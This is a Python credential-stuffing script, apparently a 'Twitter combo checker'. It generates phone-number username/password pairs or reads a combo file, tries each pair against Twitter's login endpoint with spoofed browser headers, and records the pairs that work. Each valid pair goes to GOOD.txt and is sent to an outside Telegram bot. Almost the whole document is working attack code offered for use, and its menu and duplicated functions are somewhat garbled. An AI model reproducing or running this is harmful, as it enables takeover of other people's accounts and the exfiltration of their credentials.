
import requests
import random
import time
import os

os.system("rm -rf combo.txt")
try:os.remove("combo.txt")
except:pass
os.system('clear')

logo = """
\033[1;91m

\033[0;1m------------------------------------------------------
\033[32m BY BY DECODE: MR,VEAR
\033[0;1m------------------------------------------------------
"""
print(logo)
print('\n\033[0;1m{ 2 } = \033[32mCHECKER TWITTER { COMBO }\n\033[0;1m{ 2 } = \033[32mCHECKER TWITTER { COMBO  }')
danial = input('\nRAQAM 2 DAGRA: ')


if danial=="1":
		os.system('clear')
		def combo():
			for lol in range(3000):
				tm=random.randint(1000000, 9999999)
				ss=("964770"+str(tm)+":0770"+str(tm))
				with open("combo.txt", "a") as bo:
					bo.write(str(ss)+"\n")
				yo=random.randint(1000000, 9999999)
				sos=("964771"+str(yo)+":0771"+str(yo))
				with open("combo.txt", "a") as bo:
					bo.write(str(sos)+"\n")
				nk=random.randint(1000000, 9999999)
				sks=("964750"+str(nk)+":0750"+str(nk))
				with open("combo.txt", "a") as bo:
					bo.write(str(sks)+"\n")
				kl=random.randint(1000000, 9999999)
				ssl=("964751"+str(kl)+":0751"+str(kl))
				with open("combo.txt", "a") as bo:
					bo.write(str(ssl)+"\n")
				uo=random.randint(1000000, 9999999)
				po=("964780"+str(uo)+":0780"+str(uo))
				with open("combo.txt", "a") as bo:
					bo.write(str(po)+"\n")
		combo()
		kondom="combo.txt"
		hi=open(kondom,"r").read().splitlines()
		for oo in hi:
			user=oo.split(':')[0]
			pess=oo.split(':')[1]
def CHECK(user,pess):
	head={
	'authority': 'abs.twimg.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'origin': 'https://twitter.com',
    'referer': 'https://twitter.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'script',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',}
	data={
		'redirect_after_login': '/',
		'remember_me': '1',
		'authenticity_token': '10908ac0975311eb868c135992f7d397',
		'wfa': '1',
		'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		'session[username_or_email]': user,
		'session[password]': pess}
	try:
		time.sleep(0.5)
		req=requests.post(f'https://twitter.com/sessions',headers=head,data=data)
		if ("ct0") in req.cookies:
			os.system('clear')
			print(logo)
			print(f'\033[0;1m[\033[32m+\033[0;1m] \033[32mGOOD: {user}:{pess} ')
			u=f"""
ACCOUNT TWITTER
EMAIL: {user}
PASS: {pess}
BY DECODE: MR,VEAR
"""
			try:
				requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={u}')
			except:
				pass
			with open('GOOD.txt', 'a') as x:
				x.write(f'{user}:{pess}'+'\n')
		else:
			os.system('clear')
			print(logo)
			print(f'\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD: {user}:{pess}')
	except requests.exceptions.ConnectionError:
		print("[-] !!")
	except KeyboardInterrupt:
		exit(0)

#----------------------------------------

if danial=="2":
	os.system('clear')
print(logo)
ID=input('ID TELEGRAM: ')
os.system('clear')
print(logo)
token=input('TOKEN BOT: ')
os.system('clear')
def CHECK(user,pess):
	head={
	'authority': 'abs.twimg.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'origin': 'https://twitter.com',
    'referer': 'https://twitter.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'script',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',}
	data={
		'redirect_after_login': '/',
		'remember_me': '1',
		'authenticity_token': '10908ac0975311eb868c135992f7d397',
		'wfa': '1',
		'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		'session[username_or_email]': user,
		'session[password]': pess}
	try:
		time.sleep(0.5)
		req=requests.post(f'https://twitter.com/sessions',headers=head,data=data)
		if ("ct0") in req.cookies:
			os.system('clear')
			print(logo)
			print(f'\033[0;1m[\033[32m+\033[0;1m] \033[32mGOOD: {user}:{pess} ')
			u=f"""
ACCOUNT TWITTER
EMAIL: {user}
PASS: {pess}
BY DECODE: MR,VEAR
"""
			try:
				requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={u}')
			except:
				pass
			with open('GOOD.txt', 'a') as x:
				x.write(f'{user}:{pess}'+'\n')
		else:
			os.system('clear')
			print(logo)
			print(f'\033[0;1m[\033[1;91m-\033[0;1m] \033[1;91mBAD: {user}:{pess}')
	except requests.exceptions.ConnectionError:
		print("[-] !!")
	except KeyboardInterrupt:
		exit(0)
def FILname():
	print(logo)
	F=input('/PATH COMBO FILE: ')
	try:
		for x in open(F,'r').read().splitlines():
			user=x.split(":")[0]
			pess=x.split(":")[1]
			CHECK(user,pess)
	except FileNotFoundError:
		print('\nCOMBO GHALATA YAN PATH!\n')
		return FILname()
FILname()
